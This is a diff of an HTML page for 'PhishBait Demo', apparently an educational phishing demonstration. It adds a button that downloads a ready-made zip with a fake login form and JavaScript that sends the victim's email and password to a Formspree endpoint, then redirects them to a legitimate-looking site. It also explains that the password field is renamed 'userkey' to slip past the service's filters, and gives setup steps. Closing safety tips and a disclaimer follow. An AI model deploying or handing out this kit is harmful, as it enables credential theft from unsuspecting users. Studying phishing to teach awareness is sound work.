@@ -1,17 +1,27 @@
 <!DOCTYPE html>
 <html lang="en">
-    <head>
-        <meta charset="UTF-8" />
-        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-        <title>PhishBait Demo</title>
-        <style>
-            body {
-                background-color: #2d2d2d;
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>PhishBait Demo</title>
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/atom-one-dark.min.css"
+    />
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/highlight.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.0/jszip.min.js"></script>
+    <script>
+      hljs.highlightAll();
+    </script>
+    <style>
+      body {
+                background-color: #333;
                 color: #f1f1f1;
                 font-family: Arial, Helvetica, sans-serif;
                 margin: 0;
                 padding: 0;
                 user-select: none;
+                background-attachment: fixed;
             }
 
             .container {
@@ -31,6 +41,16 @@
                 margin: 1rem 0;
             }
 
+            p code {
+                background-color: #1e1e1e;
+                color: #f8f8f2;
+                font-family: "Fira Code", monospace;
+                font-size: 0.9rem;
+                padding: 2px 6px;
+                border-radius: 4px;
+                white-space: nowrap;
+            }
+
             a {
                 color: #339dff;
                 text-decoration: none;
@@ -41,130 +61,260 @@
             }
 
             pre {
-                background-color: #1e1e1e;
+                background: #1e1e1e !important;
                 padding: 1rem;
                 border-radius: 8px;
                 overflow-x: auto;
                 user-select: text;
+                border: none !important;
             }
 
             code {
                 font-family: "Fira Code", monospace;
-                color: #d63384;
                 font-size: 0.95rem;
+            }
+
+            .paragraph {
+                margin-bottom: 3rem;
+            }
+
+            .code-block {
+                margin-bottom: 2rem;
+                border-radius: 8px;
+                background: #1e1e1e;
+                position: relative;
+                padding-top: 1rem;
+            }
+
+            .code-label {
+                position: absolute;
+                top: 0;
+                left: 0;
+                transform: translateY(-50%);
+                background-color: #444;
+                color: #ffffff;
+                padding: 0.4rem 1rem;
+                font-weight: bold;
+                font-size: 0.9rem;
+                width: 100%;
+                box-sizing: border-box;
+                border-top-left-radius: 8px;
+                border-top-right-radius: 8px;
+                border-bottom: 1px solid #444;
+                z-index: 1;
+            }
+
+            .code-block pre {
+                margin: 0;
+                padding: 1rem;
+                border-radius: 0 0 8px 8px;
+                background: transparent;
+                border: none;
+                position: relative;
+                z-index: 0;
+            }
+
+            .download-button {
+                background: linear-gradient(2deg, #a113d0 1%, #2e72e6 100%);
+                color: white;
+                width: 100%;
+                padding: 0.6rem;
+                border: none;
+                border-radius: 8px;
+                cursor: pointer;
+                font-size: 1rem;
+                font-weight: bold;
+            }
+
+            .download-button:hover {
+                background-color: #1a9f2c;
+            }
+
+            .hljs {
+                background: #1e1e1e !important;
             }
 
             .warning {
                 font-weight: bold;
                 margin-top: 2rem;
+                color: inherit;
             }
-        </style>
-    </head>
-    <body>
-        <div class="container">
-            <h2>Overview</h2>
-            <hr />
-            <p>
-                Phishing is a form of cyber attack where an attacker
-                impersonates a legitimate entity or website to trick individuals
-                into providing sensitive information, such as login credentials
-                or personal details. This demonstration simulates a basic
-                phishing scenario in which user input is captured through a
-                malicious form.
-            </p>
+    </style>
+    <script>
+      document.addEventListener("DOMContentLoaded", () => {
+        document.getElementById("download-demo").addEventListener("click", () => {
+          const zip = new JSZip();
 
-            <p>
-                This implementation utilizes
-                <a href="https://www.formspree.io" target="_blank" rel="noopener noreferrer">Formspree</a>, a
-                form-handling service that collects submitted form data and
-                sends it to the attacker’s email. While this demonstration is
-                intentionally simple, attackers typically create more
-                sophisticated and convincing websites that mimic legitimate
-                services.
-            </p>
+          const htmlContent = `<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+    <title>PhishBait Demo</title>
+  </head>
+  <body>
+    <form id="phishy-form" action="<your formspree url>" method="POST">
+      <label>Email:</label>
+      <input type="email" name="email" required />
+      <label>Password:</label>
+      <input type="text" name="userkey" required />
+      <button id="my-form-button">Submit</button>
+    </form>
+    <script src="script.js"><\/script>
+  </body>
+</html>`;
 
-            <h3>How it works</h3>
-            <hr />
-            <p>
-                The page collects input from the user, in this case an email and
-                password.
-            </p>
-            <pre><code>
-&lt;form id="phishy-form" action="&lt;your formspree url&gt;" method="POST"&gt;
+          const jsContent = `document
+  .getElementById("phishy-form")
+  .addEventListener("submit", async function (e) {
+    e.preventDefault();
+    let formData = new FormData(this);
+    try {
+      let response = await fetch("<your formspree url>", {
+        method: "POST",
+        body: formData,
+        headers: { Accept: "application/json" },
+      });
 
-    &lt;label&gt;Email:&lt;/label&gt;
-    &lt;input type="email" name="email" required /&gt;
-  
-    &lt;label&gt;Password:&lt;/label&gt;
-    &lt;input type="text" name="userkey" required /&gt;
-  
-    &lt;button id="my-form-button"&gt;Submit&lt;/button&gt;
-&lt;/form&gt;
+      if (response.ok) {
+        window.location.href = "https://www.example.com/";
+      }
+    } catch (error) {
+      console.error("Error: ", error);
+    }
+  });`;
 
-&lt;script&gt;
-    document
-        .getElementById("phishy-form")
-        .addEventListener("submit", async function (e) {
-        e.preventDefault();
-        let formData = new FormData(this);
-        try {
-            let response = await fetch("&lt;your formspree url&gt;", {
-                method: "POST",
-                body: formData,
-                headers: { Accept: "application/json" },
-            });
+          const notesContent = `This project demonstrates how a basic phishing form can be created using HTML and JavaScript, 
+and how form data can be captured and sent for free using a service like Formspree.
 
-            if (response.ok) {
-                window.location.href = "https://www.example.com/";
-            }
-        } catch (error) {
-            console.error("Error: ", error);
-        }
+Using this code for malicious purposes is illegal.`
+
+          zip.file("index.html", htmlContent);
+          zip.file("script.js", jsContent);
+          zip.file("notes.txt", notesContent);
+
+          zip.generateAsync({ type: "blob" }).then((content) => {
+            const a = document.createElement("a");
+            a.href = URL.createObjectURL(content);
+            a.download = "phishbait-demo.zip";
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+          });
+        });
+      });
+    </script>
+  </head>
+  <body>
+    <div class="container">
+      <h2>Overview</h2>
+      <hr />
+      <p>
+        Phishing is a form of cyber attack where an attacker impersonates a
+        legitimate entity or website to trick individuals into providing
+        sensitive information, such as login credentials or personal details.
+        This demonstration simulates a basic phishing scenario in which user
+        input is captured through a malicious form that mimics a login page.
+      </p>
+      <p>
+        This example utilizes
+        <a href="https://www.formspree.io" target="_blank" rel="noopener noreferrer">Formspree</a>,
+        a form-handling service that collects submitted form data and sends it
+        to an email endpoint. While this demo is basic, attackers frequently use
+        advanced tactics such as cloned login portals, fake 2FA prompts,
+        and embedded malware scripts to increase success rates.
+      </p>
+
+      <h2>How it works</h2>
+      <hr />
+      <p class="paragraph">
+        The page collects input from the user, in this case an email and
+        password, using a seemingly legitimate form.
+      </p>
+      <div class="code-block">
+        <div class="code-label">HTML</div>
+        <pre><code class="language-html">&lt;form id="phishy-form" action="&lt;your formspree url&gt;" method="POST"&gt;
+  &lt;label&gt;Email:&lt;/label&gt;
+  &lt;input type="email" name="email" required /&gt;
+  &lt;label&gt;Password:&lt;/label&gt;
+  &lt;input type="text" name="userkey" required /&gt;
+  &lt;button id="my-form-button"&gt;Submit&lt;/button&gt;
+&lt;/form&gt;</code></pre>
+      </div>
+      <div class="code-block">
+        <div class="code-label">JavaScript</div>
+        <pre><code class="language-javascript">document
+  .getElementById("phishy-form")
+  .addEventListener("submit", async function (e) {
+    e.preventDefault();
+    let formData = new FormData(this);
+    let response = await fetch("&lt;your formspree url&gt;", {
+      method: "POST",
+      body: formData,
+      headers: { Accept: "application/json" },
     });
-&lt;/script&gt;
-    </code></pre>
 
-            <p>
-                Note: The `name` attribute for the password field is set to
-                `userkey`. This avoids detection by Formspree's filters which
-                may block obvious names like `password`. Once the user submits
-                the form, the data is forwarded to the attacker's email, and the
-                victim is redirected to a legitimate-looking page.
-            </p>
+    if (response.ok) {
+      window.location.href = "https://www.example.com/";
+    }
+});</code></pre>
+      </div>
 
-            <h3>Try it yourself</h3>
-            <hr />
-            <p>
-                Visit <a href="https://www.formspree.io" target="_blank" rel="noopener noreferrer">Formspree</a> and create a
-                new form endpoint. Replace `&lt;your formspree url&gt;` in the
-                code above with the provided URL. Save the HTML and open it
-                locally. Enter sample credentials (e.g., me@example.com /
-                password123), submit, and check the associated email inbox.
-            </p>
+      <p>
+        Note: The <code>name</code> attribute for the password field is set to
+        <code>userkey</code>. This avoids detection by Formspree's filters which
+        may block fields labeled as <code>password</code>. Once submitted, the
+        victim's input is sent to the attacker's configured endpoint and the
+        user is redirected to a legitimate-looking site to avoid suspicion.
+      </p>
 
-            <h3>Conclusion</h3>
-            <hr />
-            <p>
-                This demonstration is designed to show just how shockingly easy it 
-                can be to launch a phishing attack. With just a few clicks, an 
-                attacker can create a convincing fake login page or spoofed website 
-                to trick users into handing over their credentials.
-            </p>
-            <p>
-                Always double-check URLs before clicking, especially in emails or messages. 
-                Attackers commonly disguise malicious links using URL shorteners, such as 
-                <a href="https://www.bitly.com" target="_blank" rel="noopener noreferrer">bit.ly</a>. 
-                Avoid entering sensitive information on websites unless you're absolutely sure they are legitimate. 
-                To identify a phishing URL, look for HTTPS in the address bar and verify the domain name carefully. 
-                You can also use <a href="https://www.virustotal.com/gui/home/url" target="_blank" rel="noopener noreferrer">VirusTotal</a> 
-                to scan suspicious links. Always double-check domain spelling, as even small differences can indicate a phishing attempt.
-            </p>
+      <h2>Try it yourself</h2>
+      <hr />
+      <button id="download-demo" class="download-button">Download Demo Code</button>
+      <p>
+        Visit
+        <a href="https://www.formspree.io" target="_blank" rel="noopener noreferrer">Formspree</a>
+        and create a new form endpoint. Replace
+        <code>&lt;your formspree url&gt;</code> in the code with your form URL.
+        Save the HTML and open it locally. Enter some random credentials (e.g.
+        me@example.com and password123), submit, and check your email inbox associated with your Formspree account.
+      </p>
 
-            <p class="warning">
-                THIS DEMONSTRATION IS STRICTLY INTENDED FOR EDUCATIONAL PURPOSES
-                ONLY. THE USE OF THIS TECHNIQUE FOR MALICIOUS PURPOSES IS
-                ILLEGAL.
-            </p>
-        </div>
-    </body>
+      <h2>Conclusion</h2>
+      <hr />
+      <p>
+        This demo illustrates how surprisingly simple it can be to launch a
+        phishing attack. Real-world attacks may involve cloned corporate login
+        portals, fake password reset requests, urgent security warnings, or
+        embedded social engineering.
+      </p>
+      <p>
+        Be cautious of unsolicited emails, especially those that urge immediate
+        action or contain shortened links (e.g., <a href="https://bit.ly">bit.ly</a>).
+        Verify domains and always check for HTTPS. Don’t rely solely on the
+        padlock icon—attackers can still acquire certificates for lookalike
+        domains.
+      </p>
+      <p>
+        Advanced phishing may also involve:
+        <ul>
+          <li>Fake browser pop-ups requesting re-authentication</li>
+          <li>Malicious QR codes ("quishing") directing users to phishing pages</li>
+          <li>Voice phishing (vishing), impersonating banks or tech support</li>
+          <li>Credential harvesting via fake mobile apps</li>
+          <li>Prompt bombing (multiple login requests to trick 2FA confirmation)</li>
+        </ul>
+      </p>
+      <p>
+        Use link scanners like <a href="https://www.virustotal.com/gui/home/url" target="_blank" rel="noopener noreferrer">VirusTotal</a>
+        and enable multi-factor authentication where available. If unsure,
+        contact the organization directly via a trusted source.
+      </p>
+      <hr>
+      <p>PhishBait is open source. Check it out on <a href="https://www.github.com/luckalgorithm/phishbait" target="_blank" rel="noopener noreferrer">GitHub</a>!</p>
+      <p class="warning">
+        THIS DEMONSTRATION IS STRICTLY INTENDED FOR EDUCATIONAL PURPOSES ONLY.
+        USING THESE TECHNIQUES FOR MALICIOUS PURPOSES IS ILLEGAL.
+      </p>
+    </div>
+  </body>
 </html>
